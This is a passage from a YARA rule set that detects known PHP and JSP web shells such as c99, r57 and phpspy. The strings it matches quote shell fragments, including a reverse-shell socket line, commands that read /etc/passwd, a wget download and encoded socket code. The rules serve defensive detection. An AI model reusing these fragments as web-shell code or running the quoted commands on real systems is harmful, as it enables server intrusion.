        hash21 = "2434a7a07cb47ce25b41d30bc291cacc"
        hash22 = "7a4b090619ecce6f7bd838fe5c58554b"

    strings:
        $s1 = "\"<h2>Remote Control &raquo;</h2><input class=\\\"bt\\\" onclick=\\\"var"
        $s2 = "\"<p>Current File (import new file name and new file)<br /><input class=\\\"inpu"
        $s3 = "\"<p>Current file (fullpath)<br /><input class=\\\"input\\\" name=\\\"file\\\" i"
    condition:
        all of them
}
rule webshell_201_3_ma_download {
    meta:
        id = "LUJH7DuAhDwb1tfDuvVPF"
        fingerprint = "v1_sha256_14eccd07e7bef9d570f75fc4adc204d175dcfbb5b950bdb3e25a65d3c5bb0310"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 201.jsp, 3.jsp, ma.jsp, download.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "a7e25b8ac605753ed0c438db93f6c498"
        hash1 = "fb8c6c3a69b93e5e7193036fd31a958d"
        hash2 = "4cc68fa572e88b669bce606c7ace0ae9"
        hash3 = "fa87bbd7201021c1aefee6fcc5b8e25a"

    strings:
        $s0 = "<input title=\"Upload selected file to the current working directory\" type=\"Su"
        $s5 = "<input title=\"Launch command in current directory\" type=\"Submit\" class=\"but"
        $s6 = "<input title=\"Delete all selected files and directories incl. subdirs\" class="
    condition:
        all of them
}
rule webshell_browser_201_3_400_in_JFolder_jfolder01_jsp_leo_ma_warn_webshell_nc_download {
    meta:
        id = "5m5myHtQym8hFGN3Kfi22L"
        fingerprint = "v1_sha256_0bf0fd37b542c9362a47180ee03ea28995b48d483f72273e472292a320a3ddee"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, ma.jsp, warn.jsp, webshell-nc.jsp, download.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "37603e44ee6dc1c359feb68a0d566f76"
        hash1 = "a7e25b8ac605753ed0c438db93f6c498"
        hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
        hash3 = "36331f2c81bad763528d0ae00edf55be"
        hash4 = "793b3d0a740dbf355df3e6f68b8217a4"
        hash5 = "8979594423b68489024447474d113894"
        hash6 = "ec482fc969d182e5440521c913bab9bd"
        hash7 = "f98d2b33cd777e160d1489afed96de39"
        hash8 = "4b4c12b3002fad88ca6346a873855209"
        hash9 = "4cc68fa572e88b669bce606c7ace0ae9"
        hash10 = "e9a5280f77537e23da2545306f6a19ad"
        hash11 = "598eef7544935cf2139d1eada4375bb5"
        hash12 = "fa87bbd7201021c1aefee6fcc5b8e25a"

    strings:
        $s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
        $s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
    condition:
        all of them
}
rule webshell_shell_phpspy_2006_arabicspy {
    meta:
        id = "2uy0vajb1KLKdIOvIpMOu"
        fingerprint = "v1_sha256_bd9f1ffdbf94dd5a871fc7c3b31d2357e99265d02bfe1c836f82d251053dce7d"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php"
        category = "INFO"
        super_rule = 1
        hash0 = "791708057d8b429d91357d38edf43cc0"
        hash1 = "40a1f840111996ff7200d18968e42cfe"
        hash2 = "e0202adff532b28ef1ba206cf95962f2"

    strings:
        $s0 = "elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype"
        $s8 = "echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"P"
    condition:
        all of them
}
rule webshell_in_JFolder_jfolder01_jsp_leo_warn {
    meta:
        id = "22NhzSiohllyHz3v8Whvas"
        fingerprint = "v1_sha256_00c3667438a688b990cf1c8bb6db52be7c6d1b36192dece4e8b07edda68f4b72"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "793b3d0a740dbf355df3e6f68b8217a4"
        hash1 = "8979594423b68489024447474d113894"
        hash2 = "ec482fc969d182e5440521c913bab9bd"
        hash3 = "f98d2b33cd777e160d1489afed96de39"
        hash4 = "4b4c12b3002fad88ca6346a873855209"
        hash5 = "e9a5280f77537e23da2545306f6a19ad"

    strings:
        $s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
        $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"
    condition:
        all of them
}
rule webshell_2_520_icesword_job_ma1_ma4_2 {
    meta:
        id = "yv53ItvsCDTHgZL3YFe0s"
        fingerprint = "v1_sha256_765efb4f776d9ffe5dab1b5decbb60df654e1de9ab8ae7e0437c5c8f717642b9"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "64a3bf9142b045b9062b204db39d4d57"
        hash1 = "9abd397c6498c41967b4dd327cf8b55a"
        hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
        hash3 = "56c005690da2558690c4aa305a31ad37"
        hash4 = "532b93e02cddfbb548ce5938fe2f5559"
        hash5 = "6e0fa491d620d4af4b67bae9162844ae"
        hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"

    strings:
        $s2 = "private String[] _textFileTypes = {\"txt\", \"htm\", \"html\", \"asp\", \"jsp\","
        $s3 = "\\\" name=\\\"upFile\\\" size=\\\"8\\\" class=\\\"textbox\\\" />&nbsp;<input typ"
        $s9 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"passwor"
    condition:
        all of them
}
rule webshell_phpspy_2005_full_phpspy_2005_lite_PHPSPY {
    meta:
        id = "729nzZtn2bIQl7o6SQ8Vp7"
        fingerprint = "v1_sha256_80c8e7b50aea91284a25ffd3a07d8705c24b6a95a58f42ec6043ececcff32dbb"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php"
        category = "INFO"
        super_rule = 1
        hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
        hash1 = "42f211cec8032eb0881e87ebdb3d7224"
        hash2 = "0712e3dc262b4e1f98ed25760b206836"

    strings:
        $s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma"
        $s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE"
        $s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; "
    condition:
        2 of them
}
rule webshell_shell_phpspy_2006_arabicspy_hkrkoz {
    meta:
        id = "6fj9vRHzNHCnA6ImUMXhB4"
        fingerprint = "v1_sha256_228e0a73f14da2957f75ae898fdbcf2386deb366df6ddc312162ab723bac44ba"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files shell.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
        category = "INFO"
        super_rule = 1
        hash0 = "791708057d8b429d91357d38edf43cc0"
        hash1 = "40a1f840111996ff7200d18968e42cfe"
        hash2 = "e0202adff532b28ef1ba206cf95962f2"
        hash3 = "802f5cae46d394b297482fd0c27cb2fc"

    strings:
        $s5 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
    condition:
        all of them
}
rule webshell_c99_Shell_ci_Biz_was_here_c100_v_xxx {
    meta:
        id = "3vsGh5hiC9iLq8ho6E16G7"
        fingerprint = "v1_sha256_ccc3cb553f7b5d089a43612d48522cc4a66b4a8ab433321ae1a716a8fa57b62c"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files c99.php, Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c66.php, c99-shadows-mod.php, c99shell.php"
        category = "INFO"
        super_rule = 1
        hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
        hash1 = "f2fa878de03732fbf5c86d656467ff50"
        hash2 = "27786d1e0b1046a1a7f67ee41c64bf4c"
        hash3 = "0f5b9238d281bc6ac13406bb24ac2a5b"
        hash4 = "68c0629d08b1664f5bcce7d7f5f71d22"
        hash5 = "048ccc01b873b40d57ce25a4c56ea717"

    strings:
        $s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\""
    condition:
        all of them
}
rule webshell_2008_2009lite_2009mssql {
    meta:
        id = "65Skghb4MVO10xBHadJUYi"
        fingerprint = "v1_sha256_ae33048856440e25972aa5483b60e775f50f60a9ef5e77a58edd60eacdcd9ee3"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php"
        category = "INFO"
        super_rule = 1
        hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
        hash1 = "3f4d454d27ecc0013e783ed921eeecde"
        hash2 = "aa17b71bb93c6789911bd1c9df834ff9"

    strings:
        $s0 = "<a href=\"javascript:godir(\\''.$drive->Path.'/\\');"
        $s7 = "p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all"
    condition:
        all of them
}
rule webshell_shell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_arabicspy_PHPSPY_hkrkoz {
    meta:
        id = "4q8mFblZWcT8U20E0Ut5vK"
        fingerprint = "v1_sha256_5da06481cf789e71969a5b54a33bfab41e08a1961cc056604a696203fef48422"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php"
        category = "INFO"
        super_rule = 1
        hash0 = "791708057d8b429d91357d38edf43cc0"
        hash1 = "b68bfafc6059fd26732fa07fb6f7f640"
        hash2 = "42f211cec8032eb0881e87ebdb3d7224"
        hash3 = "40a1f840111996ff7200d18968e42cfe"
        hash4 = "e0202adff532b28ef1ba206cf95962f2"
        hash5 = "0712e3dc262b4e1f98ed25760b206836"
        hash6 = "802f5cae46d394b297482fd0c27cb2fc"

    strings:
        $s0 = "$mainpath_info           = explode('/', $mainpath);" fullword
        $s6 = "if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \"d"
    condition:
        all of them
}
rule webshell_807_dm_JspSpyJDK5_m_cofigrue {
    meta:
        id = "4Yd0aILpv8gGcpcChuUZlM"
        fingerprint = "v1_sha256_0fc7ac740e147bd3703dac74743b19148aa7bb359cc5f347acf3b0dbe26bf752"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
        hash1 = "14e9688c86b454ed48171a9d4f48ace8"
        hash2 = "341298482cf90febebb8616426080d1d"
        hash3 = "88fc87e7c58249a398efd5ceae636073"
        hash4 = "349ec229e3f8eda0f9eb918c74a8bf4c"

    strings:
        $s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
        $s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
    condition:
        1 of them
}
rule webshell_Dive_Shell_1_0_Emperor_Hacking_Team_xxx {
    meta:
        id = "1T29ziYWbT7el0ZKDYeCw5"
        fingerprint = "v1_sha256_8bf11041a16060fa32431adfe33727863355bae7fec2cf841dcc919092db5c80"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php"
        category = "INFO"
        super_rule = 1
        hash0 = "1b5102bdc41a7bc439eea8f0010310a5"
        hash1 = "f8a6d5306fb37414c5c772315a27832f"
        hash2 = "37cb1db26b1b0161a4bf678a6b4565bd"

    strings:
        $s1 = "if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals"
        $s9 = "if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {" fullword
    condition:
        all of them
}
rule webshell_404_data_in_JFolder_jfolder01_xxx {
    meta:
        id = "2DLbfJJrf8d5XOD1VNe16W"
        fingerprint = "v1_sha256_171b811c1b93f99f3070692a91a0462f80d9d52ecf26d7fb7297a8bdd9a4c014"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "7066f4469c3ec20f4890535b5f299122"
        hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
        hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
        hash3 = "8979594423b68489024447474d113894"
        hash4 = "ec482fc969d182e5440521c913bab9bd"
        hash5 = "f98d2b33cd777e160d1489afed96de39"
        hash6 = "4b4c12b3002fad88ca6346a873855209"
        hash7 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
        hash8 = "e9a5280f77537e23da2545306f6a19ad"

    strings:
        $s4 = "&nbsp;<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TE"
    condition:
        all of them
}
rule webshell_jsp_reverse_jsp_reverse_jspbd {
    meta:
        id = "6a002OKr5Zl7rOaseSmGjn"
        fingerprint = "v1_sha256_cd7409bb6ace3044f3d0bf380133c4fe4a7c0c0309f9d800b397439aa95f81fc"
        version = "1.0"
        score = 50
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "8b0e6779f25a17f0ffb3df14122ba594"
        hash1 = "ea87f0c1f0535610becadf5a98aca2fc"
        hash2 = "7d5e9732766cf5b8edca9b7ae2b6028f"

    strings:
        $s0 = "osw = new BufferedWriter(new OutputStreamWriter(os));" fullword
        $s7 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword
        $s9 = "isr = new BufferedReader(new InputStreamReader(is));" fullword
    condition:
        all of them
}
rule webshell_400_in_JFolder_jfolder01_jsp_leo_warn_webshell_nc {
    meta:
        id = "72ScpjexzNE27QjM53K2vB"
        fingerprint = "v1_sha256_74e31e51f2cb46a042e8591ffb44fe68fb591d202c8171c6afb556eddb381f6f"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "36331f2c81bad763528d0ae00edf55be"
        hash1 = "793b3d0a740dbf355df3e6f68b8217a4"
        hash2 = "8979594423b68489024447474d113894"
        hash3 = "ec482fc969d182e5440521c913bab9bd"
        hash4 = "f98d2b33cd777e160d1489afed96de39"
        hash5 = "4b4c12b3002fad88ca6346a873855209"
        hash6 = "e9a5280f77537e23da2545306f6a19ad"
        hash7 = "598eef7544935cf2139d1eada4375bb5"

    strings:
        $s0 = "sbFolder.append(\"<tr><td >&nbsp;</td><td>\");" fullword
        $s1 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword
        $s5 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword
        $s6 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword
    condition:
        2 of them
}
rule webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2 {
    meta:
        id = "6eAA0Pe5tiJpCCTsBlTumQ"
        fingerprint = "v1_sha256_49614b2a42210fa134f85fa52c66e12809f2bb9eaf56c17b69d21e5fbfc8888b"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp"
        category = "INFO"
        super_rule = 1
        hash0 = "64a3bf9142b045b9062b204db39d4d57"
        hash1 = "9abd397c6498c41967b4dd327cf8b55a"
        hash2 = "56c005690da2558690c4aa305a31ad37"
        hash3 = "70a0ee2624e5bbe5525ccadc467519f6"
        hash4 = "532b93e02cddfbb548ce5938fe2f5559"
        hash5 = "6e0fa491d620d4af4b67bae9162844ae"
        hash6 = "7eabe0f60975c0c73d625b7ddf7b9cbd"

    strings:
        $s1 = "while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {" fullword
        $s6 = "password = (String)session.getAttribute(\"password\");" fullword
        $s7 = "insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\"GB231"
    condition:
        2 of them
}
rule webshell_shell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
    meta:
        id = "1HcEAG0PAMcVPocQr6QxcB"
        fingerprint = "v1_sha256_140af92ab61059649a872bef96b916f2c402fd9891301d4a1ba1f389a45af003"
        version = "1.0"
        score = 60
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files shell.php, 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
        category = "INFO"
        super_rule = 1
        hash0 = "791708057d8b429d91357d38edf43cc0"
        hash1 = "3e4ba470d4c38765e4b16ed930facf2c"
        hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
        hash3 = "b68bfafc6059fd26732fa07fb6f7f640"
        hash4 = "40a1f840111996ff7200d18968e42cfe"
        hash5 = "e0202adff532b28ef1ba206cf95962f2"
        hash6 = "802f5cae46d394b297482fd0c27cb2fc"

    strings:
        $s0 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword
        $s5 = "while(list($kname, $columns) = @each($index)) {" fullword
        $s6 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword
        $s9 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword
        $fn = "filename: backup"
    condition:
        2 of ($s*) and not $fn
}
rule webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx {
    meta:
        id = "1I3SkgYa4xJAWE9fM3sBVh"
        fingerprint = "v1_sha256_24d93f9ae5e174873a32abdf8dca6c00f03cbb4c5e2ad531ac7fa34f8fc90794"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files gfs_sh.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, r57.php, Backdoor.PHP.Agent.php"
        category = "INFO"
        super_rule = 1
        hash0 = "a2516ac6ee41a7cf931cbaef1134a9e4"
        hash1 = "ef43fef943e9df90ddb6257950b3538f"
        hash2 = "ae025c886fbe7f9ed159f49593674832"
        hash3 = "911195a9b7c010f61b66439d9048f400"
        hash4 = "697dae78c040150daff7db751fc0c03c"
        hash5 = "513b7be8bd0595c377283a7c87b44b2e"
        hash6 = "1d912c55b96e2efe8ca873d6040e3b30"
        hash7 = "e5b2131dd1db0dbdb43b53c5ce99016a"
        hash8 = "4108f28a9792b50d95f95b9e5314fa1e"
        hash9 = "41af6fd253648885c7ad2ed524e0692d"
        hash10 = "6fcc283470465eed4870bcc3e2d7f14d"

    strings:
        $s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
        $s11 = "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC"
    condition:
        all of them
}
rule webshell_itsec_PHPJackal_itsecteam_shell_jHn {
    meta:
        id = "34V5k3IT4h0CWgotlVzeE2"
        fingerprint = "v1_sha256_0c97731c28f59a6fbab2b7882fae171da8d71add73ec92ab6093dec57fcd7207"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php"
        category = "INFO"
        super_rule = 1
        hash0 = "8ae9d2b50dc382f0571cd7492f079836"
        hash1 = "e2830d3286001d1455479849aacbbb38"
        hash2 = "bd6d3b2763c705a01cc2b3f105a25fa4"
        hash3 = "40c6ecf77253e805ace85f119fe1cebb"

    strings:
        $s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
        $s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|"
        $s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+"
    condition:
        2 of them
}
rule webshell_Shell_ci_Biz_was_here_c100_v_xxx {
    meta:
        id = "3JPilb7fnqSp5BPfazUASV"
        fingerprint = "v1_sha256_a7841dec442877648a589045849f7f1b80316a30dda5a44ccc4bb626dbd2cdea"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php"
        category = "INFO"
        super_rule = 1
        hash0 = "f2fa878de03732fbf5c86d656467ff50"
        hash1 = "27786d1e0b1046a1a7f67ee41c64bf4c"
        hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"

    strings:
        $s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri"
        $s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\""
        $s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
        $s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de"
        $s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER"
    condition:
        2 of them
}
rule webshell_NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_xxx1 {
    meta:
        id = "7JgCwW3BUh1To0zdNBUyTx"
        fingerprint = "v1_sha256_95d25e9dc75a9af91e23b8c53acb384616f5d8a78605200bdb94f016a7f160f6"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php"
        category = "INFO"
        super_rule = 1
        hash0 = "0b19e9de790cd2f4325f8c24b22af540"
        hash1 = "f3ca29b7999643507081caab926e2e74"
        hash2 = "527cf81f9272919bf872007e21c4bdda"

    strings:
        $s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
        $s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
        $s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
        $s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
    condition:
        2 of them
}
rule webshell_c99_c99shell_c99_w4cking_Shell_xxx {
    meta:
        id = "2gNVRMaPSOv3IYOBU0CR14"
        fingerprint = "v1_sha256_731bbf06208d20874c1d8464472e6a66a2e9b0bc2dc0475783763b99eb70fefa"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files c99.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, acid.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c66.php, c99-shadows-mod.php, c99.php, c99shell.php"
        category = "INFO"
        super_rule = 1
        hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
        hash1 = "d3f38a6dc54a73d304932d9227a739ec"
        hash2 = "9c34adbc8fd8d908cbb341734830f971"
        hash3 = "f2fa878de03732fbf5c86d656467ff50"
        hash4 = "b8f261a3cdf23398d573aaf55eaf63b5"
        hash5 = "27786d1e0b1046a1a7f67ee41c64bf4c"
        hash6 = "0f5b9238d281bc6ac13406bb24ac2a5b"
        hash7 = "68c0629d08b1664f5bcce7d7f5f71d22"
        hash8 = "157b4ac3c7ba3a36e546e81e9279eab5"
        hash9 = "048ccc01b873b40d57ce25a4c56ea717"

    strings:
        $s0 = "echo \"<b>HEXDUMP:</b><nobr>"
        $s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
        $s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r"
        $s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB "
        $s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";" fullword
        $s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>"
    condition:
        2 of them
}
rule webshell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
    meta:
        id = "36pPTw0P6PSwOzmLXL6CNW"
        fingerprint = "v1_sha256_2d78db4d45a35d6a78d4288e00a382a0937e3806f0570bd353b88955664a47f6"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
        category = "INFO"
        super_rule = 1
        hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
        hash1 = "aa17b71bb93c6789911bd1c9df834ff9"
        hash2 = "b68bfafc6059fd26732fa07fb6f7f640"
        hash3 = "40a1f840111996ff7200d18968e42cfe"
        hash4 = "e0202adff532b28ef1ba206cf95962f2"
        hash5 = "802f5cae46d394b297482fd0c27cb2fc"

    strings:
        $s0 = "$this -> addFile($content, $filename);" fullword
        $s3 = "function addFile($data, $name, $time = 0) {" fullword
        $s8 = "function unix2DosTime($unixtime = 0) {" fullword
        $s9 = "foreach($filelist as $filename){" fullword
    condition:
        all of them
}
rule webshell_c99_c66_c99_shadows_mod_c99shell {
    meta:
        id = "3sg3bhKXM0hMpP5aMI6r7H"
        fingerprint = "v1_sha256_b50a6124f25bbb6fcc9d16d1de26d833a4b968db8e8033e76f3a74695577017e"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
